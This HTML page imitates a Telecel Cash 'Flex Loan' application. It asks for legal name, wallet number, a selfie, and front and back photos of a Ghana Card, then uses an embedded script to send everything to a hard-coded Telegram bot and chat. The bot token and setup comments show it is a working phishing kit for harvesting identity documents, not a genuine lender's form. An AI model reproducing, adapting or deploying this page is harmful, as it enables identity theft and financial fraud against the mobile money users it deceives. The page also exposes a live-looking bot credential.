<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apply for Flex Loan — Telecel Cash</title>
  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --red: #E30613;
      --dark: #0A0F1C;
      --card: #121A2E;
      --text: #E8EAF0;
      --muted: #8892A4;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'DM Sans', sans-serif;
      background: var(--dark);
      color: var(--text);
      min-height: 100vh;
      padding: 16px;
    }
    .container {
      max-width: 480px;
      margin: 0 auto;
      background: var(--card);
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 10px 40px rgba(0,0,0,0.6);
    }
    .header {
      padding: 20px;
      text-align: center;
      border-bottom: 1px solid #1F2A44;
    }
    .progress {
      display: flex;
      justify-content: center;
      gap: 12px;
      padding: 20px 0;
      background: #0A0F1C;
    }
    .step {
      width: 32px; height: 32px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 14px;
    }
    .step.active { background: var(--red); color: white; }
    .step.done { background: #10B981; color: white; }
    .step-line { flex: 1; height: 3px; background: #1F2A44; margin-top: 14px; }
    .step-line.done { background: #10B981; }

    .content {
      padding: 24px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      font-size: 12px;
      font-weight: 600;
      color: var(--muted);
      margin-bottom: 8px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    input, select {
      width: 100%;
      padding: 14px 16px;
      background: #1F2A44;
      border: none;
      border-radius: 12px;
      color: white;
      font-size: 16px;
    }
    .photo-section {
      margin: 28px 0;
      text-align: center;
    }
    .photo-title {
      font-size: 15px;
      font-weight: 700;
      margin-bottom: 12px;
      color: #fff;
    }
    .camera-circle {
      width: 120px;
      height: 120px;
      margin: 0 auto 12px;
      background: #1F2A44;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      border: 3px solid #E30613;
      position: relative;
    }
    .preview-img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 50%;
    }
    .upload-btn {
      background: #1F2A44;
      color: white;
      border: 1px solid #E30613;
      padding: 12px 24px;
      border-radius: 12px;
      font-weight: 600;
      cursor: pointer;
      margin: 8px;
    }
    .btn-continue {
      width: 100%;
      background: var(--red);
      color: white;
      border: none;
      padding: 16px;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      margin-top: 20px;
    }
    .eligibility {
      background: rgba(16,185,129,0.15);
      border: 1px solid #10B981;
      border-radius: 12px;
      padding: 16px;
      margin: 24px 0;
    }
    .preview-container {
      margin-top: 10px;
      text-align: center;
    }
    .preview-container img {
      max-width: 100%;
      border-radius: 12px;
      margin: 8px 0;
      border: 2px solid #10B981;
    }
  </style>
</head>
<body>

<div class="container">
  <!-- Header -->
  <div class="header">
    <h2 style="color:white; font-size:20px;">Personal Information</h2>
  </div>

  <!-- Progress -->
  <div class="progress">
    <div class="step done">1</div>
    <div class="step-line done"></div>
    <div class="step active">2</div>
    <div class="step-line"></div>
    <div class="step">3</div>
  </div>

  <div class="content">
    <div class="form-group">
      <label>Legal First Name</label>
      <input type="text" id="firstName" placeholder="Legal first name">
    </div>
    <div class="form-group">
      <label>Legal Last Name</label>
      <input type="text" id="lastName" placeholder="Legal last name">
    </div>
    <div class="form-group">
      <label>Telecel Cash Number</label>
      <input type="tel" id="phone" placeholder="020 000 0000" maxlength="10">
    </div>

    <!-- PHOTO VERIFICATION -->
    <div class="photo-section">
      <div class="photo-title">📸 PHOTO VERIFICATION</div>
      <div class="camera-circle" id="selfieContainer">
        <input type="file" id="selfieInput" accept="image/*" capture="user" style="display:none">
        <button onclick="document.getElementById('selfieInput').click()" style="background:none;border:none;color:white;font-size:40px;cursor:pointer;">📷</button>
      </div>
      <button class="upload-btn" onclick="document.getElementById('selfieInput').click()">Take Selfie</button>
      <div class="preview-container" id="selfiePreview"></div>
    </div>

    <!-- Ghana Card -->
    <div class="photo-section">
      <div class="photo-title">GHANA CARD VERIFICATION</div>
      <div style="display:flex; gap:12px; justify-content:center; flex-wrap:wrap;">
        <div>
          <button class="upload-btn" onclick="document.getElementById('frontInput').click()">Upload Front</button>
          <input type="file" id="frontInput" accept="image/*" style="display:none">
          <div class="preview-container" id="frontPreview"></div>
        </div>
        <div>
          <button class="upload-btn" onclick="document.getElementById('backInput').click()">Upload Back</button>
          <input type="file" id="backInput" accept="image/*" style="display:none">
          <div class="preview-container" id="backPreview"></div>
        </div>
      </div>
    </div>

    <div class="eligibility">
      <strong style="color:#10B981;">✓ ELIGIBILITY CHECK</strong><br>
      Must be an active Telecel Cash wallet holder
    </div>

    <button class="btn-continue" onclick="submitApplication()">CONTINUE →</button>
  </div>
</div>

<script>
  // === CONFIGURE YOUR TELEGRAM BOT ===
  const BOT_TOKEN = "8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88";   // ← Change this
  const CHAT_ID = "8889432014";       // ← Change this (your Telegram ID or group ID)

  let selfieFile = null;
  let frontFile = null;
  let backFile = null;

  // Preview images
  function previewImage(input, previewId, storageVar) {
    const file = input.files[0];
    if (!file) return;

    window[storageVar] = file;

    const reader = new FileReader();
    reader.onload = function(e) {
      document.getElementById(previewId).innerHTML = `
        <img src="${e.target.result}" alt="Preview">
        <small style="color:#10B981;">✓ Uploaded</small>
      `;
    };
    reader.readAsDataURL(file);
  }

  document.getElementById('selfieInput').addEventListener('change', function() {
    previewImage(this, 'selfiePreview', 'selfieFile');
  });
  document.getElementById('frontInput').addEventListener('change', function() {
    previewImage(this, 'frontPreview', 'frontFile');
  });
  document.getElementById('backInput').addEventListener('change', function() {
    previewImage(this, 'backPreview', 'backFile');
  });

  // Send to Telegram
  async function sendToTelegram(file, caption) {
    if (!file || !BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN") {
      console.log("Telegram not configured");
      return;
    }

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    formData.append('caption', caption);

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } catch (e) {
      console.error("Telegram send failed", e);
    }
  }

  async function submitApplication() {
    const firstName = document.getElementById('firstName').value.trim();
    const lastName = document.getElementById('lastName').value.trim();
    const phone = document.getElementById('phone').value.trim();

    if (!firstName || !lastName || !phone) {
      alert("Please fill all personal details.");
      return;
    }

    const baseCaption = `🆕 New Loan Application\n\n👤 Name: ${firstName} ${lastName}\n📱 Phone: ${phone}\n\n`;

    // Send Selfie
    if (selfieFile) {
      await sendToTelegram(selfieFile, baseCaption + "📸 Selfie");
    }
    // Send Ghana Card Front
    if (frontFile) {
      await sendToTelegram(frontFile, baseCaption + "🪪 Ghana Card - Front");
    }
    // Send Ghana Card Back
    if (backFile) {
      await sendToTelegram(backFile, baseCaption + "🪪 Ghana Card - Back");
    }

    alert("Application submitted successfully! Documents sent to admin via Telegram.");
    // You can redirect or go to next step here
    // window.location.href = "verify.html?...";
  }
</script>

</body>
</html>
